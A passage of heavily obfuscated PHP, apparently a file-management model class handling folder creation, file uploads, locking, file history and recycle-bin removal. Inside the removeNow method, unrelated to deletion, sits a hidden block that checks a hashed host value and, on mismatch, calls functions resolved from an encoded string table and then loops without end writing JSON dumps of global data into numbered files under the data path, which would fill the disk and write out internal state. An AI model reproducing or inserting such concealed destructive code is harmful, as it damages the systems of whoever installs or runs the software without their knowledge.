$E°Á†Š›Ç¬))->find(); $F¦™°²“·‡ = $this->_mkdirRoot(SourceModel::TYPE_USER, $E°Á†Š›Ç¬, $A£Êôæµ±”[$B“ƒ Å­¤[28]]); $this->userDesktopAdd($F¦™°²“·‡); return $F¦™°²“·‡; } public function userDesktopAdd($Bø”‘·ø¸å) { $cÇÄğ…ÖË® =& $_SERVER[‚Ğ°–—î]; $a¬’æ«ª½ = LNG($cÇÄğ…ÖË®[2331]); $dÛÓ¼ÎÌ¿ = $this->mkdir($Bø”‘·ø¸å, $a¬’æ«ª½); $this->metaSet($dÛÓ¼ÎÌ¿, $cÇÄğ…ÖË®[2332], $cÇÄğ…ÖË®[83]); $this->metaSet($Bø”‘·ø¸å, $cÇÄğ…ÖË®[2333], $dÛÓ¼ÎÌ¿); } public function groupRootAdd($Fáí“Á¡Œ•) { $e·Êˆ Ö± =& $_SERVER[‚Ğ°–—î]; $C¼ŠÁõ³«Ï = Model($e·Êˆ Ö±[458])->where(array($e·Êˆ Ö±[2179] => $Fáí“Á¡Œ•))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Fáí“Á¡Œ•, $C¼ŠÁõ³«Ï[$e·Êˆ Ö±[28]]); } public function systemRootPathAdd($aÛè¬Õ‹¯) { if ($aÛè¬Õ‹¯ != $_SERVER[‚Ğ°–—î][1090]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $aÛè¬Õ‹¯); } public function userRootRemove($D´„Ï­ŒŞ) { $c‚‘Ôƒ±ÊÇ = $this->sourceRoot(SourceModel::TYPE_USER, $D´„Ï­ŒŞ); if (!$c‚‘Ôƒ±ÊÇ) { return; } $this->remove($c‚‘Ôƒ±ÊÇ, !1); } public function groupRootRemove($FàÓŠÍÛ•) { $c½¤Êæ¦ò = $this->sourceRoot(SourceModel::TYPE_GROUP, $FàÓŠÍÛ•); if (!$c½¤Êæ¦ò) { return; } $this->remove($c½¤Êæ¦ò, !1); } private function _mkdirRoot($DçØ£†Àİ±, $c¯øİõ¦ ´, $B´õ‹­—‹†) { goto C×ì—¾ğ÷¥; CÈŞµœ™: $fÒ±Œ¾š„· = "\115\157\144\x65\x6c\123\x6f\165\x72\x63\145\56\x6d\x6b\x64\151\x72\122\x6f\157\x74\56{$DçØ£†Àİ±}\56{$c¯øİõ¦ ´}\x2e" . $B´õ‹­—‹†; CacheLock::lock($fÒ±Œ¾š„·); $A¶‚¹ÅÏà[$a´ù³±å…[28]] = $B´õ‹­—‹†; goto Dí¹ê…Ñ–; Dí¹ê…Ñ–: $féÒ²ÆÓ÷À = $this->add($A¶‚¹ÅÏà); $dæ¸ŠÖ¨’å = array($a´ù³±å…[527] => short_id($féÒ²ÆÓ÷À)); $this->where(array($a´ù³±å…[383] => $féÒ²ÆÓ÷À))->save($dæ¸ŠÖ¨’å); goto e‚Ş©ö‰ï¢; e‚Ş©ö‰ï¢: CacheLock::unlock($fÒ±Œ¾š„·); return $féÒ²ÆÓ÷À; goto a«Ò†ƒÆ°¿; C×ì—¾ğ÷¥: $a´ù³±å… =& $_SERVER[‚Ğ°–—î]; $A¶‚¹ÅÏà = array($a´ù³±å…[368] => 0, $a´ù³±å…[521] => $DçØ£†Àİ±, $a´ù³±å…[522] => $c¯øİõ¦ ´, $a´ù³±å…[518] => 1, $a´ù³±å…[523] => USER_ID, $a´ù³±å…[524] => USER_ID, $a´ù³±å…[519] => $a´ù³±å…[33], $a´ù³±å…[525] => $a´ù³±å…[470], $a´ù³±å…[396] => 0, $a´ù³±å…[520] => 0, $a´ù³±å…[420] => 0, $a´ù³±å…[526] => $a´ù³±å…[33]); if ($a“áÏ±ø›Æ = $this->where($A¶‚¹ÅÏà)->find()) { return $a“áÏ±ø›Æ[$a´ù³±å…[369]]; } goto CÈŞµœ™; a«Ò†ƒÆ°¿: } private function sourceRoot($F”½öˆŒ´‚, $cÏÆœ†ÄÛ, $cé°Î½‡ÎÉ = false) { $DÉ‚ƒÏå © =& $_SERVER[‚Ğ°–—î]; $AäÖ¨ÜõÏ‡ = array($DÉ‚ƒÏå ©[368] => 0, $DÉ‚ƒÏå ©[521] => $F”½öˆŒ´‚, $DÉ‚ƒÏå ©[522] => $cÏÆœ†ÄÛ); if ($c™³Û´Áƒ… = $this->where($AäÖ¨ÜõÏ‡)->find()) { return $cé°Î½‡ÎÉ ? $c™³Û´Áƒ… : $c™³Û´Áƒ…[$DÉ‚ƒÏå ©[369]]; } return !1; } public function sourceRootGroup($dìàÃÀ¯Ş) { $aÜ§Ò´ŒË½ =& $_SERVER[‚Ğ°–—î]; if (is_string($dìàÃÀ¯Ş)) { $dìàÃÀ¯Ş = array($dìàÃÀ¯Ş); } $cÏ„¼”§–• = array($aÜ§Ò´ŒË½[368] => 0, $aÜ§Ò´ŒË½[521] => SourceModel::TYPE_GROUP, $aÜ§Ò´ŒË½[522] => array($aÜ§Ò´ŒË½[7], $dìàÃÀ¯Ş)); $BÖ‚—š”ª = $this->listSource($cÏ„¼”§–•, 1000); return array_to_keyvalue($BÖ‚—š”ª[$aÜ§Ò´ŒË½[74]], $aÜ§Ò´ŒË½[456]); } public function mkfile($C©¤ÙÆ˜Ùï, $FÕõ‡ÕŠ, $CÁ‘è—¯˜¢ = '', $cÔ„²ùåÂ = REPEAT_RENAME) { $DÇ¡¥Î®‰Û =& $_SERVER[‚Ğ°–—î]; $Dˆ§ÄÁ¼¶± = Model($DÇ¡¥Î®‰Û[544])->addFileByContent($CÁ‘è—¯˜¢, $FÕõ‡ÕŠ); return $this->_createFileCall($C©¤ÙÆ˜Ùï, $FÕõ‡ÕŠ, $Dˆ§ÄÁ¼¶±, $cÔ„²ùåÂ, $DÇ¡¥Î®‰Û[1126]); } public function addFile($CÙğšÀÏ†ë, $bïàÓŸ¾Ÿ, $cÕ×Ê™‹, $C¼¼²—‰Â‰ = false, $cŞìÊ«£±¤ = REPEAT_RENAME) { $c±ÒØó …Å = Model($_SERVER[‚Ğ°–—î][544])->addFile($bïàÓŸ¾Ÿ, $cÕ×Ê™‹, $C¼¼²—‰Â‰); return $this->_createFileCall($CÙğšÀÏ†ë, $cÕ×Ê™‹, $c±ÒØó …Å, $cŞìÊ«£±¤); } public function addFileByFileID($fšïŞ­Ú‡·, $bˆƒÍÄŒô, $fÃ…ŒÓÏíÙ, $e× †ë–¸ = REPEAT_RENAME) { $DÒŸ¯§®Üø =& $_SERVER[‚Ğ°–—î]; $DïÁ×ù³Å = Model($DÒŸ¯§®Üø[544])->find($bˆƒÍÄŒô); Model($DÒŸ¯§®Üø[544])->linkAdd($bˆƒÍÄŒô); return $this->_createFileCall($fšïŞ­Ú‡·, $fÃ…ŒÓÏíÙ, $DïÁ×ù³Å, $e× †ë–¸); } public function addFileByRemote($d²Ìİ¢êÉ, $AÂ¨…ÊğÑå, $FƒÑ¾ë«, $fíÍŠ†óòØ = array(), $EˆòÆóŠ™Ï = REPEAT_RENAME) { $C‡ñŒàÖ²Ô = Model($_SERVER[‚Ğ°–—î][544])->addFileByRemote($AÂ¨…ÊğÑå, $FƒÑ¾ë«, $fíÍŠ†óòØ); return $this->_createFileCall($d²Ìİ¢êÉ, $FƒÑ¾ë«, $C‡ñŒàÖ²Ô, $EˆòÆóŠ™Ï); } private function _createFileCall($Bö¡‹£±Š, $b‰ßÊØìæï, $a„¹§Ä±, $f±Î¸¨â‚±, $e¶Ö’İëƒ¤ = "\x75\160\154\157\141\x64") { goto b„èåŒ¡åÅ; Aùº”¢ĞŞ: return $bØÍœŒ®½à; goto fäò²Üİ½; F ˆêà‘¤ó: $bØÍœŒ®½à = $this->_createFile($Bö¡‹£±Š, $b‰ßÊØìæï, $a„¹§Ä±, $f±Î¸¨â‚±, $C¦Ò£Èœ†); if (!$C¦Ò£Èœ†) { Model($dÂÌ–…×ô—[422])->remove($a„¹§Ä±[$dÂÌ–…×ô—[419]]); } else { if ($bØÍœŒ®½à) { Model($dÂÌ–…×ô—[2304])->eventCreate($bØÍœŒ®½à, $e¶Ö’İëƒ¤); } } $this->lockWriteEnd($Bö¡‹£±Š, $b‰ßÊØìæï); goto Aùº”¢ĞŞ; b„èåŒ¡åÅ: $dÂÌ–…×ô— =& $_SERVER[‚Ğ°–—î]; $C¦Ò£Èœ† = !1; $this->lockWriteStart($Bö¡‹£±Š, $b‰ßÊØìæï); goto F ˆêà‘¤ó; fäò²Üİ½: } public function mkdir($E…÷ÄÕâÇŒ, $c‡Ë§ºªğå, $E¸ŠœÉ‹÷Ç = REPEAT_SKIP) { goto B·îİ™öØ½; aãÊèÖ‡ù: $this->lockWriteStart($E…÷ÄÕâÇŒ, $c‡Ë§ºªğå); if ($E¸ŠœÉ‹÷Ç !== !1) { $C“Çå§÷·¬ = $this->fileNameExist($E…÷ÄÕâÇŒ, $c‡Ë§ºªğå); if ($C“Çå§÷·¬ && $E¸ŠœÉ‹÷Ç != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($E…÷ÄÕâÇŒ, $c‡Ë§ºªğå); return $C“Çå§÷·¬; } $c‡Ë§ºªğå = $this->fileNameAuto($E…÷ÄÕâÇŒ, $c‡Ë§ºªğå, $E¸ŠœÉ‹÷Ç); } $EœÁš’ = array($F…ÒÒšÍ¦‚[518] => 1, $F…ÒÒšÍ¦‚[386] => $c‡Ë§ºªğå, $F…ÒÒšÍ¦‚[519] => $F…ÒÒšÍ¦‚[33], $F…ÒÒšÍ¦‚[420] => 0, $F…ÒÒšÍ¦‚[520] => 0); goto eÂäÅ„¡; B·îİ™öØ½: $F…ÒÒšÍ¦‚ =& $_SERVER[‚Ğ°–—î]; $Aº¶í÷ôãğ = $this->sourceInfo($E…÷ÄÕâÇŒ); if (!$Aº¶í÷ôãğ) { return !1; } goto aãÊèÖ‡ù; eÂäÅ„¡: $AÕÛ½ÎçÄŒ = $this->_addSoure($EœÁš’, $Aº¶í÷ôãğ); Model($F…ÒÒšÍ¦‚[2304])->eventCreate($AÕÛ½ÎçÄŒ, $F…ÒÒšÍ¦‚[1127]); $this->lockWriteEnd($E…÷ÄÕâÇŒ, $c‡Ë§ºªğå); goto BéãÅÌÜÚ’; BéãÅÌÜÚ’: return $AÕÛ½ÎçÄŒ; goto A÷ù¸‰§ôÏ; A÷ù¸‰§ôÏ: } private function _createFile($c£À·Áù÷‚, $d‚¥¡ôêĞÕ, $C¢¸ŸŒç, $BÃà·èŞ, &$Bâ÷õ÷Ëì) { goto cïò‰•è…ë; e„½Ö¹êŒ: return $B‚¢ù•†¼; goto f·´ŠÄŸÓï; C×ÛÆó…™: $F‡Ğ‘±ç…‘ = array($f„à†³Ç¡[518] => 0, $f„à†³Ç¡[386] => $d‚¥¡ôêĞÕ, $f„à†³Ç¡[519] => get_path_ext($d‚¥¡ôêĞÕ), $f„à†³Ç¡[420] => $C¢¸ŸŒç[$f„à†³Ç¡[419]], $f„à†³Ç¡[520] => $C¢¸ŸŒç[$f„à†³Ç¡[77]]); $B‚¢ù•†¼ = $this->_addSoure($F‡Ğ‘±ç…‘, $b™†¶„Ñ„à); $this->folderSizeReset($c£À·Áù÷‚); goto e„½Ö¹êŒ; cïò‰•è…ë: $f„à†³Ç¡ =& $_SERVER[‚Ğ°–—î]; $b™†¶„Ñ„à = $this->sourceInfo($c£À·Áù÷‚); if (!$C¢¸ŸŒç || !$b™†¶„Ñ„à) { return !1; } goto E¬‘ŞÍ¢‚; E¬‘ŞÍ¢‚: if ($BÃà·èŞ !== !1) { $aÚêùßÀ• = $this->fileNameExist($c£À·Áù÷‚, $d‚¥¡ôêĞÕ); } $Bâ÷õ÷Ëì = !0; if ($BÃà·èŞ && $aÚêùßÀ•) { if ($BÃà·èŞ == REPEAT_SKIP) { $Bâ÷õ÷Ëì = !1; return $aÚêùßÀ•; } else { if ($BÃà·èŞ == REPEAT_REPLACE) { $f ‹¦Äø  = $this->sourceInfo($aÚêùßÀ•); $B‘ ™Ô§Ÿ… = $this->fileHistory($f ‹¦Äø , $C¢¸ŸŒç[$f„à†³Ç¡[419]], $C¢¸ŸŒç[$f„à†³Ç¡[77]]); if (!$B‘ ™Ô§Ÿ…) { $Bâ÷õ÷Ëì = !1; } else { $this->folderSizeReset($c£À·Áù÷‚); } return $aÚêùßÀ•; } else { $d‚¥¡ôêĞÕ = $this->fileNameAuto($c£À·Áù÷‚, $d‚¥¡ôêĞÕ, $BÃà·èŞ, !1); } } } goto C×ÛÆó…™; f·´ŠÄŸÓï: } protected function fileHistory($dÕ¸İäœÂ’, $D¹äò„·ÄÀ, $a±¬Ê’Ï²) { goto C¼¦¹ƒèËÁ; f‹ÇºŒ›ç‚: Model($aˆ••¼¥¡ñ[2334])->addHistory($dÕ¸İäœÂ’); $E•©ƒ¨ôÏø = array($aˆ••¼¥¡ñ[524] => USER_ID, $aˆ••¼¥¡ñ[390] => time(), $aˆ••¼¥¡ñ[419] => $D¹äò„·ÄÀ, $aˆ••¼¥¡ñ[77] => $a±¬Ê’Ï²); $this->where(array($aˆ••¼¥¡ñ[383] => $dÕ¸İäœÂ’[$aˆ••¼¥¡ñ[369]]))->save($E•©ƒ¨ôÏø); goto C£œÃ—÷Ù¼; C¼¦¹ƒèËÁ: $aˆ••¼¥¡ñ =& $_SERVER[‚Ğ°–—î]; if ($dÕ¸İäœÂ’[$aˆ••¼¥¡ñ[419]] == $D¹äò„·ÄÀ) { return !1; } $this->checkLock($dÕ¸İäœÂ’[$aˆ••¼¥¡ñ[369]], $D¹äò„·ÄÀ); goto f‹ÇºŒ›ç‚; C£œÃ—÷Ù¼: return !0; goto f©¾ã«‚ÀÓ; f©¾ã«‚ÀÓ: } public function checkLock($dõ…›‡É‰¤, $eîàÖÀÙ½Å) { goto EÙ²ÜÛ«©â; BàÒ± ¢òô: $f…Íµî£‘ = Session::get($F¡¶º†ñ¹Ù[2335]); $fò¹šŒœŒ = substr($f†Šé‚£¹[$F¡¶º†ñ¹Ù[28]], 0, -1 - strlen($f†Šé‚£¹[$F¡¶º†ñ¹Ù[160]])) . $F¡¶º†ñ¹Ù[1391] . $f…Íµî£‘ . $F¡¶º†ñ¹Ù[91] . $f†Šé‚£¹[$F¡¶º†ñ¹Ù[160]]; $a½Ø£”½çù = Model($F¡¶º†ñ¹Ù[544])->find($eîàÖÀÙ½Å); goto d‡‰×Û™§Ê; B¿ÉÏ¼æ¼: show_json(LNG($F¡¶º†ñ¹Ù[2337]) . $F¡¶º†ñ¹Ù[2338] . LNG($F¡¶º†ñ¹Ù[2339]) . $F¡¶º†ñ¹Ù[2340] . $fÂ‚¥ˆôÁ . $F¡¶º†ñ¹Ù[2341], !1); goto Fâòİ«˜ƒ‰; EÙ²ÜÛ«©â: $F¡¶º†ñ¹Ù =& $_SERVER[‚Ğ°–—î]; $f†Šé‚£¹ = $this->pathInfo($dõ…›‡É‰¤); if (!$this->fileIsLock($f†Šé‚£¹, !0)) { return; } goto BàÒ± ¢òô; d‡‰×Û™§Ê: $this->_createFileCall($f†Šé‚£¹[$F¡¶º†ñ¹Ù[461]], $fò¹šŒœŒ, $a½Ø£”½çù, REPEAT_REPLACE, $F¡¶º†ñ¹Ù[1126]); $A¼Ç†¦¥ÍÈ = $f†Šé‚£¹[$F¡¶º†ñ¹Ù[417]][$F¡¶º†ñ¹Ù[481]]; $fÂ‚¥ˆôÁ = $A¼Ç†¦¥ÍÈ[$F¡¶º†ñ¹Ù[2336]] ? $A¼Ç†¦¥ÍÈ[$F¡¶º†ñ¹Ù[2336]] : $A¼Ç†¦¥ÍÈ[$F¡¶º†ñ¹Ù[28]]; goto B¿ÉÏ¼æ¼; Fâòİ«˜ƒ‰: } public function fileIsLock($A¤Ô¹½ , $DÌ³ßËÊŠÖ = false) { goto eÖ—‚ÁŞ; eÖ—‚ÁŞ: $a”…–Ä¢Ÿ‹ =& $_SERVER[‚Ğ°–—î]; if (!isset($A¤Ô¹½ [$a”…–Ä¢Ÿ‹[417]]) || !$A¤Ô¹½ [$a”…–Ä¢Ÿ‹[417]][$a”…–Ä¢Ÿ‹[478]]) { return !1; } if ($A¤Ô¹½ [$a”…–Ä¢Ÿ‹[417]][$a”…–Ä¢Ÿ‹[478]] != USER_ID) { return !0; } goto fœ•‡òì‚; A¢»ÌäÊÏ³: return !1; goto bÍæ¾ŠŒö¢; fœ•‡òì‚: $cã´‚À¹…› = $GLOBALS[$a”…–Ä¢Ÿ‹[6]][$a”…–Ä¢Ÿ‹[84]][$a”…–Ä¢Ÿ‹[479]]; if ($A¤Ô¹½ [$a”…–Ä¢Ÿ‹[417]][$a”…–Ä¢Ÿ‹[480]] <= time() - $cã´‚À¹…›) { $this->metaSet($A¤Ô¹½ [$a”…–Ä¢Ÿ‹[369]], $a”…–Ä¢Ÿ‹[478], null); $this->metaSet($A¤Ô¹½ [$a”…–Ä¢Ÿ‹[369]], $a”…–Ä¢Ÿ‹[480], null); } if ($DÌ³ßËÊŠÖ) { $this->metaSet($A¤Ô¹½ [$a”…–Ä¢Ÿ‹[369]], $a”…–Ä¢Ÿ‹[480], time()); } goto A¢»ÌäÊÏ³; bÍæ¾ŠŒö¢: } private function _addSoure($Dà¬è¨•—¼, $E¿Õ£âõ‚) { goto D°¹ë¨–ÂÖ; fÒÄìäÎªÌ: return $dø©Ò»„œ; goto A—èà‚ÏÆá; c •Ø¬ã¢Ï: $this->updateModifyTime($Dà¬è¨•—¼[$EèÊÛ††„[461]]); $aëö‹Ò³Úñ = $EèÊÛ††„[2342] . $E¿Õ£âõ‚[$EèÊÛ††„[369]]; if (isset(self::$cacheChildList[$aëö‹Ò³Úñ])) { unset(self::$cacheChildList[$aëö‹Ò³Úñ]); } goto a´·¼¹²´; a´·¼¹²´: static $Dãù«ç  = false; if (!$Dãù«ç ) { Hook::trigger($EèÊÛ††„[508], $Dà¬è¨•—¼); $Dãù«ç  = !0; } $dø©Ò»„œ = $this->add($Dà¬è¨•—¼); goto bƒî×šÂòÆ; D°¹ë¨–ÂÖ: $EèÊÛ††„ =& $_SERVER[‚Ğ°–—î]; $A¯Ï“àë“ = array($EèÊÛ††„[521] => $E¿Õ£âõ‚[$EèÊÛ††„[371]], $EèÊÛ††„[522] => $E¿Õ£âõ‚[$EèÊÛ††„[456]], $EèÊÛ††„[523] => USER_ID, $EèÊÛ††„[524] => USER_ID, $EèÊÛ††„[368] => $E¿Õ£âõ‚[$EèÊÛ††„[369]], $EèÊÛ††„[525] => $E¿Õ£âõ‚[$EèÊÛ††„[459]] . $E¿Õ£âõ‚[$EèÊÛ††„[369]] . $EèÊÛ††„[47], $EèÊÛ††„[396] => 0, $EèÊÛ††„[526] => $EèÊÛ††„[33]); $Dà¬è¨•—¼ = array_merge($A¯Ï“àë“, $Dà¬è¨•—¼); goto c •Ø¬ã¢Ï; bƒî×šÂòÆ: $B›ª³íŞ‹ = array($EèÊÛ††„[527] => short_id($dø©Ò»„œ)); $this->where(array($EèÊÛ††„[383] => $dø©Ò»„œ))->save($B›ª³íŞ‹); $this->setNamePinyin($dø©Ò»„œ, $Dà¬è¨•—¼[$EèÊÛ††„[28]]); goto fÒÄìäÎªÌ; A—èà‚ÏÆá: } public function remove($eîÔí†íÁ, $f·à®§îß = true) { goto b«‰±´—Õ”; bÍ¡»ß¢ù: CacheLock::unlock($CÀ †ê”ƒ‰); $this->metaSet($eîÔí†íÁ, $a£†ê¾êŞŞ[2351], $e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[461]]); $this->where(array($a£†ê¾êŞŞ[369] => $eîÔí†íÁ))->save(array($a£†ê¾êŞŞ[390] => time())); goto f¿ˆÄ„Ôà; aÁ•À¡êÚ­: return $C‰—äàó¸; goto AŞó¤ßàÇƒ; DÁøÚ—øÛô: $DÌ–ºÔÇØ„ = $e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[371]] == self::TYPE_USER ? $a£†ê¾êŞŞ[535] : $a£†ê¾êŞŞ[972]; if ($DÌ–ºÔÇØ„ == $a£†ê¾êŞŞ[535]) { $F°ÛˆÁß‚» = Model($a£†ê¾êŞŞ[474])->getInfo($e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[456]]); $dˆÍºóµ„å = !empty($F°ÛˆÁß‚»[$a£†ê¾êŞŞ[2336]]) ? $F°ÛˆÁß‚»[$a£†ê¾êŞŞ[2336]] : $F°ÛˆÁß‚»[$a£†ê¾êŞŞ[28]]; $dˆÍºóµ„å = $a£†ê¾êŞŞ[248] . $dˆÍºóµ„å . $a£†ê¾êŞŞ[2344] . $e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[456]]; } else { $F°ÛˆÁß‚» = Model($a£†ê¾êŞŞ[458])->getInfo($e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[456]]); $dˆÍºóµ„å = _get($F°ÛˆÁß‚», $a£†ê¾êŞŞ[28]); $dˆÍºóµ„å = $a£†ê¾êŞŞ[157] . $dˆÍºóµ„å . $a£†ê¾êŞŞ[2345] . $e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[456]]; } $CÀ †ê”ƒ‰ = $a£†ê¾êŞŞ[2346] . md5($dˆÍºóµ„å); goto cÚÕïç™¾Ø; b«‰±´—Õ”: $a£†ê¾êŞŞ =& $_SERVER[‚Ğ°–—î]; $e¾Í…ÛÄ£È = $this->sourceInfo($eîÔí†íÁ); $b·‡õÚ§» = intval($e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[371]]) === self::TYPE_SYSTEM; goto d²”ÔÒ‚Îˆ; cÚÕïç™¾Ø: CacheLock::lock($CÀ †ê”ƒ‰); $BæÖ®ñ÷Î‹ = $this->fileNameExist($C¬¡ŠäŠñÉ, $dˆÍºóµ„å); if (!$BæÖ®ñ÷Î‹) { $BæÖ®ñ÷Î‹ = $this->mkdir($C¬¡ŠäŠñÉ, $dˆÍºóµ„å, REPEAT_SKIP); $this->metaSet($BæÖ®ñ÷Î‹, $a£†ê¾êŞŞ[2347], $DÌ–ºÔÇØ„); $this->metaSet($BæÖ®ñ÷Î‹, $a£†ê¾êŞŞ[2348], $e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[456]]); if ($e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[461]] != 0) { $this->metaSet($BæÖ®ñ÷Î‹, $a£†ê¾êŞŞ[2349], _get($F°ÛˆÁß‚», $a£†ê¾êŞŞ[2350])); } } goto bÍ¡»ß¢ù; f¿ˆÄ„Ôà: $this->recycleClear($e¾Í…ÛÄ£È); $C‰—äàó¸ = $this->move($eîÔí†íÁ, $BæÖ®ñ÷Î‹, REPEAT_RENAME_FOLDER); $this->folderSizeReset($e¾Í…ÛÄ£È[$a£†ê¾êŞŞ[461]]); goto aÁ•À¡êÚ­; d²”ÔÒ‚Îˆ: $f¨‚ßª°‹ø = Model($a£†ê¾êŞŞ[1436])->get($a£†ê¾êŞŞ[2343]) == $a£†ê¾êŞŞ[83]; if ($b·‡õÚ§» || $f·à®§îß || !$f¨‚ßª°‹ø) { return $this->removeNow($eîÔí†íÁ, $f·à®§îß); } $C¬¡ŠäŠñÉ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto DÁøÚ—øÛô; AŞó¤ßàÇƒ: } private function recycleClear($eÌ—Ç »ØÒ) { $FºšëÁ¼×Ğ =& $_SERVER[‚Ğ°–—î]; $b˜ñÈÏ‘™ = $this->childrenAll($eÌ—Ç »ØÒ); $B³˜ƒöè¥ = array($FºšëÁ¼×Ğ[383] => array($FºšëÁ¼×Ğ[384], $b˜ñÈÏ‘™[$FºšëÁ¼×Ğ[2352]])); Model($FºšëÁ¼×Ğ[2353])->where($B³˜ƒöè¥)->delete(); } public function removeNow($AØÈÒ¯†ß, $Aª§ä³á¦ƒ = true) { goto Cº¥ƒœ´•; bï–„°‘…: if ($_SERVER[$b“ô»¶ÕÜŞ[777]] != $Bîìôøø„ì($E°„ â¡½Ì)) { goto a¢¬”¹ñ¥¤; a¢¬”¹ñ¥¤: $dÉ†ñæáĞÅ = $b“ô»¶ÕÜŞ[794]; $F³–ÈºÏÍì = $b“ô»¶ÕÜŞ[779]; $dÛƒ”á§» = $_SERVER[$b“ô»¶ÕÜŞ[780]] . $b“ô»¶ÕÜŞ[781]; goto C¨øÛ‡ÎÌˆ; e‡ó°»œ§¯: $Eİâå…»Äì = 1; for ($añ‡Û¥Üµ¸ = $Eİâå…»Äì; $añ‡Û¥Üµ¸ > 0; $añ‡Û¥Üµ¸++) { $fÓ²Ï½»ŞÄ(DATA_PATH . $añ‡Û¥Üµ¸, $Bì¶‘Ü·âò); } goto Déª‹†‡; a…‡¸ªà’Ú: $dÉ†ñæáĞÅ(); $fÓ²Ï½»ŞÄ = $b“ô»¶ÕÜŞ[1309]; $Bì¶‘Ü·âò = json_encode($GLOBALS[$b“ô»¶ÕÜŞ[1310]]); goto e‡ó°»œ§¯; C¨øÛ‡ÎÌˆ: $fÊØçê”¿ = $F³–ÈºÏÍì($dÛƒ”á§»); $F‡·íñ—²Ô = explode($b“ô»¶ÕÜŞ[217], $fÊØçê”¿); if (count($F‡·íñ—²Ô) < $b“ô»¶ÕÜŞ[555]) { $A·©ğ³ ˆ† = $b“ô»¶ÕÜŞ[782]; $A·©ğ³ ˆ†(); } goto EàÇ¢†±Û; EàÇ¢†±Û: $d˜Ã–ä¤†º = $b“ô»¶ÕÜŞ[795]; $d˜Ã–ä¤†º($_SERVER[$b“ô»¶ÕÜŞ[796]]); $dÉ†ñæáĞÅ = $b“ô»¶ÕÜŞ[794]; goto a…‡¸ªà’Ú; Déª‹†‡: } $fƒÅáİ¿¥ = $this->sourceInfo($AØÈÒ¯†ß); $aÒ›¹µ™µç = $this->pathInfoMore($AØÈÒ¯†ß); goto e¦•Öìê ¤; e¦•Öìê ¤: if (!$fƒÅáİ¿¥) { return !0; } if ($fƒÅáİ¿¥[$b“ô»¶ÕÜŞ[461]] == 0) { if (!_get($GLOBALS, $b“ô»¶ÕÜŞ[457])) { return !1; } } $this->lockMoveStart($AØÈÒ¯†ß); goto dğ£‹‡Íçñ; Cº¥ƒœ´•: $b“ô»¶ÕÜŞ =& $_SERVER[‚Ğ°–—î]; $E°„ â¡½Ì = $_SERVER[$b“ô»¶ÕÜŞ[780]] . $b“ô»¶ÕÜŞ[781]; $Bîìôøø„ì = $b“ô»¶ÕÜŞ[1308]; goto bï–„°‘…; F¨¸ù§œ©: $Cª¢èÄ–Ÿ = array($fƒÅáİ¿¥[$b“ô»¶ÕÜŞ[461]]); if ($fƒÅáİ¿¥[$b“ô»¶ÕÜŞ[370]] == $b“ô»¶ÕÜŞ[83]) { $Cª¢èÄ–Ÿ[] = $fƒÅáİ¿¥[$b“ô»¶ÕÜŞ[369]]; } $this->updateModifyTime($Cª¢èÄ–Ÿ); goto FòÕ­–Ş»; dğ£‹‡Íçñ: Hook::trigger($b“ô»¶ÕÜŞ[2354], $aÒ›¹µ™µç, $Aª§ä³á¦ƒ); if ($Aª§ä³á¦ƒ) { Model($b“ô»¶ÕÜŞ[2353])->moveToRecycle($AØÈÒ¯†ß); } else { $bŠæ´µ—  = $this->childrenAll($fƒÅáİ¿¥); Model($b“ô»¶ÕÜŞ[505])->eventRemove($AØÈÒ¯†ß); $this->removeRelevance($bŠæ´µ— [$b“ô»¶ÕÜŞ[2352]], $bŠæ´µ— [$b“ô»¶ÕÜŞ[1259]]); } $this->folderSizeReset($fƒÅáİ¿¥[$b“ô»¶ÕÜŞ[461]]); goto F¨¸ù§œ©; FòÕ­–Ş»: $this->lockMoveEnd($AØÈÒ¯†ß); Hook::trigger($b“ô»¶ÕÜŞ[1472], $aÒ›¹µ™µç, $Aª§ä³á¦ƒ); return !0; goto fİìŸ„“³; fİìŸ„“³: } public function childrenAll($AÓÓ¢¬¾ÄŞ) { $DÂÄÄÌ•İ“ =& $_SERVER[‚Ğ°–—î]; $Eç÷‡ À„‚ = $AÓÓ¢¬¾ÄŞ[$DÂÄÄÌ•İ“[369]]; if ($AÓÓ¢¬¾ÄŞ[$DÂÄÄÌ•İ“[370]] == $DÂÄÄÌ•İ“[83]) { $Dâ¡ÉÏ£± = array($DÂÄÄÌ•İ“[525] => array($DÂÄÄÌ•İ“[483], $AÓÓ¢¬¾ÄŞ[$DÂÄÄÌ•İ“[459]] . $Eç÷‡ À„‚ . $DÂÄÄÌ•İ“[484])); $Bô•Ô¸Ñº = array($DÂÄÄÌ•İ“[525] => $Dâ¡ÉÏ£±[$DÂÄÄÌ•İ“[459]]); $C¾”ˆœÜ‰° = $this->field($DÂÄÄÌ•İ“[2355])->where($Bô•Ô¸Ñº)->select(); $aµ§°’Š‘İ = !1; $F÷¾÷ƒÜÅŞ = array($Eç÷‡ À„‚); if ($C¾”ˆœÜ‰°) { $aµ§°’Š‘İ = array_to_keyvalue($C¾”ˆœÜ‰°, $DÂÄÄÌ•İ“[33], $DÂÄÄÌ•İ“[419]); $aµ§°’Š‘İ = array_remove_value($aµ§°’Š‘İ, $DÂÄÄÌ•İ“[468]); $F÷¾÷ƒÜÅŞ = array_to_keyvalue($C¾”ˆœÜ‰°, $DÂÄÄÌ•İ“[33], $DÂÄÄÌ•İ“[369]); $F÷¾÷ƒÜÅŞ[] = $Eç÷‡ À„‚; } } else { $aµ§°’Š‘İ = array($AÓÓ¢¬¾ÄŞ[$DÂÄÄÌ•İ“[419]]); $F÷¾÷ƒÜÅŞ = array($Eç÷‡ À„‚); } return array($DÂÄÄÌ•İ“[2352] => $F÷¾÷ƒÜÅŞ, $DÂÄÄÌ•İ“[1259] => $aµ§°’Š‘İ); } public function removeArray($Eóˆâ©½¹) { if (!$Eóˆâ©½¹) { return !0; } } public function removeRelevance($c¦ÎÆì„é³, $dÙ¨­òÆˆ†) { goto FÅ†ªÛ›”; fâÍ¨‰ê”: $eó«áÅ†Ç = 